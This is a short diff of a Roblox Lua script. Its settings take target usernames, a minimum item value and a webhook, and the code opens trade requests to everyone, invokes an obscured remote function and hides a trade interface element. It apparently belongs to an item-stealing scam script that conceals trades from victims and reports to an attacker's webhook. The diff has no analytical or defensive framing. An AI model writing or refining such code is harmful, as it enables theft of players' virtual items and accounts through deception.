@@ -22,23 +22,18 @@ local min_rap = _G.min_rap or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
--- Validation
-if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add usernames or webhook")
-    return
-end
-
 if #Players:GetPlayers() >= 16 then
     plr:kick("Server is full. Please join a less populated server")
     return
 end
 
 -- Allow trade requests from everyone
-local tradeArgs = {
+local args = {
 	"AllowRequests",
 	"Everyone"
 }
-game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/ZJ:hlp9/*3x'jvB>ql"):InvokeServer(unpack(tradeArgs))
+game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/,v9>>@@/*3w&?xB>Hj"):InvokeServer(unpack(args))
+
 
 -- Hide UI elements
 tradeGui.Black.Visible = false
